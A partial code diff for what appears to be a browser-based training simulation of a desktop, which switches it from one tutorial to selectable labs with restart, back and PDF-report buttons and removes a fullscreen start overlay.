-tpRestart.addEventListener('click', ()=> location.reload());
+tpRestart.addEventListener('click', ()=>{ if(currentLab) startLab(currentLab.id); });
+tpBack.addEventListener('click', backToLabs);
 
 function advance(delay){
   setTimeout(()=>{
@@ -992,7 +1608,6 @@ setInterval(tickClock, 1000);
 /* ---------------- CLOSE START MENU ON OUTSIDE CLICK ---------------- */
 document.addEventListener('click', e=>{
   if(startMenuOpen && !startMenu.contains(e.target) && e.target!==startBtn && !startBtn.contains(e.target)){
-    // don't force-close mid guided step if it would strand the student
     const st = steps[stepIndex];
     if(!(st && (st.type==='type'||st.type==='click') && st.target && (st.target==='#start-search'||st.target==='#search-result-cmd'))){
       toggleStartMenu(false);
@@ -1023,11 +1638,6 @@ function showToast(msg){
 }
 
 /* ---------------- FILE EXPLORER WINDOW ---------------- */
-const explorerWindow = document.getElementById('explorer-window');
-const explorerTitle = document.getElementById('explorer-title');
-const explorerBreadcrumb = document.getElementById('explorer-breadcrumb');
-const explorerList = document.getElementById('explorer-list');
-
 function openExplorer(folderKey){
   const data = FOLDERS[folderKey];
   if(!data) return;
@@ -1093,26 +1703,16 @@ document.getElementById('desktop').addEventListener('click', ()=>{
   document.querySelectorAll('.d-icon').forEach(i=>i.classList.remove('selected'));
 });
 
-/* ---------------- START OVERLAY / FULLSCREEN ---------------- */
-const startOverlay = document.getElementById('start-overlay');
-const readyBtn = document.getElementById('ready-btn');
-
-async function enterFullscreenAndBegin(){
-  const el = document.documentElement;
-  try{
-    if(el.requestFullscreen){ await el.requestFullscreen(); }
-    else if(el.webkitRequestFullscreen){ await el.webkitRequestFullscreen(); }
-    else if(el.msRequestFullscreen){ await el.msRequestFullscreen(); }
-  }catch(err){
-    // Fullscreen may be blocked (e.g. inside a restricted iframe) — continue windowed.
-  }
-  startOverlay.style.display='none';
-  searchInput && searchInput.blur();
-}
-readyBtn.addEventListener('click', enterFullscreenAndBegin);
+/* ---------------- PDF BUTTON / MODAL HANDLERS ---------------- */
+tpPdf.addEventListener('click', openPdfModal);
+$('#pm-cancel').addEventListener('click', closePdfModal);
+pdfModal.addEventListener('click', e=>{ if(e.target===pdfModal) closePdfModal(); });
+$('#pm-ok').addEventListener('click', ()=>{
+  generatePDF($('#pm-name').value.trim(), $('#pm-sid').value.trim(), $('#pm-grade').value.trim());
+});
 
 /* ---------------- INIT ---------------- */
-renderTutorial();
+renderCards();
 
 })();
 </script>
